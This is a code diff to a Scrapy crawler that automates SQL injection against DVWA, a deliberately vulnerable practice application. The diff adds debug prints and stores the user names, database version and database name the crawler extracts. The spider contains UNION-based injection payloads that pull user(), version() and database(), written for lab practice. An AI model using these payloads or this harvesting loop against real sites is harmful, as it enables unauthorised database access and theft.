@@ -4,7 +4,7 @@ from dvwacrawler.constants import *
 from scrapy import Spider
 
 from dvwacrawler.items import DvwacrawlerItem
-from parser import html_parser
+from dvwacrawler.parser import html_parser
 
 
 class DVWASpider(Spider):
@@ -95,6 +95,7 @@ class DVWASpider(Spider):
 
     def payloads(self, response):
         type = response.meta.get('type')
+        print(type)
         payloads = ["%' or 0=0 union select null, user() #",
                     "%' or 0=0 union select null, version() #",
                     "%' or 0=0 union select null, database() #"
@@ -119,27 +120,39 @@ class DVWASpider(Spider):
                 formdata={'id': payloads[2]},
                 callback=self.parse_database
             )
+        else:
+            item = DvwacrawlerItem()
+            for user in self.db_users:
+                if user[0] != '':
+                    item['first_name'] = user[0]
+                    item['surname'] = user[1]
+                if user[0] == '' and user[1] in range(10):
+                    item['database_version'] = user[1]
+                if user[0] == '' and user[1] not in range(10):
+                    item['database_name'] = user[1]
+                print("Item - {}".format(item))
+                yield item
 
     def parse_users(self, response):
-        firstname, surname = html_parser(response)
-        self.db_users = {'first_name': firstname, 'surname': surname}
-        # item = DvwacrawlerItem()
-        # item['first_name'] = firstname
-        # item['surname'] = surname
-        # print("Items - {}".format(item))
-        # yield item
+        self.db_users = html_parser(response)
         print(self.db_users)
-
         launch_payload = scrapy.Request(url=DVWA_BASE_URL + DVWA_VULNERABILITY_POINT,
                                         callback=self.payloads)
         launch_payload.meta['type'] = 'version'
         return launch_payload
 
     def parse_version(self, response):
-        first_name, surname = html_parser(response)
-
-        # for item in self.db_users:
-        #     if first_name and surname
+        self.db_users.append(html_parser(response))
+        print("Parsed Version")
+        launch_payload = scrapy.Request(url=DVWA_BASE_URL + DVWA_VULNERABILITY_POINT,
+                                        callback=self.payloads)
+        launch_payload.meta['type'] = 'database'
+        return launch_payload
 
     def parse_database(self, response):
-        first_name, surname = html_parser(response)
+        self.db_users.append(html_parser(response))
+        print("Parsed DB Name")
+        launch_payload = scrapy.Request(url=DVWA_BASE_URL + DVWA_VULNERABILITY_POINT,
+                                        callback=self.payloads)
+        launch_payload.meta['type'] = 'done'
+        return launch_payload
